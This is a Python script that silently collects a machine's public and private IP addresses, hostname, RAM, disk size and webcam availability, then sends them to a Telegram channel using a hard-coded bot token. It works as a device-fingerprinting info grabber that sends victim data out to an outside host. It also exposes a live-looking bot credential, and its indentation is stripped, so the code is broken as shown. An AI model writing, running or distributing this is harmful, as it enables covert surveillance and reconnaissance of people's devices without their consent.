import requests
import socket
import platform
import psutil
import cv2
from telegram import Bot

# Telegram Bot token (replace with your own)
TOKEN = "6314854377:AAH227SyLa4wmyU7xJa6JlYFVYuSx39_PuE"

def get_public_ip():
response = requests.get("https://api.ipify.org/?format=json")
public_ip = response.json()["ip"]
return public_ip

def get_private_ip():
private_ip = socket.gethostbyname(socket.gethostname())
return private_ip

def get_device_model():
device_model = platform.node()
return device_model

def get_device_ram():
ram = psutil.virtual_memory().total // (1024 ** 3) # in GB
return ram

def get_device_storage():
total_storage = psutil.disk_usage('/').total // (1024 ** 3) # in GB
return total_storage

def check_camera():
camera = cv2.VideoCapture(0)
is_camera_available = camera.isOpened()
camera.release()
return is_camera_available

def send_message_to_telegram(message):
bot = Bot(TOKEN)
bot.send_message(chat_id="@Itz_Zaber_bro", text=message)

# Gather information
public_ip = get_public_ip()
private_ip = get_private_ip()
device_model = get_device_model()
device_ram = get_device_ram()
device_storage = get_device_storage()
camera_available = check_camera()

# Create message
message = "Public IP: {}\n".format(public_ip)
message += "Private IP: {}\n".format(private_ip)
message += "Device Model: {}\n".format(device_model)
message += "RAM: {} GB\n".format(device_ram)
message += "Storage: {} GB\n".format(device_storage)
message += "Camera Available: {}".format(camera_available)

# Send message to Telegram
send_message_to_telegram(message)
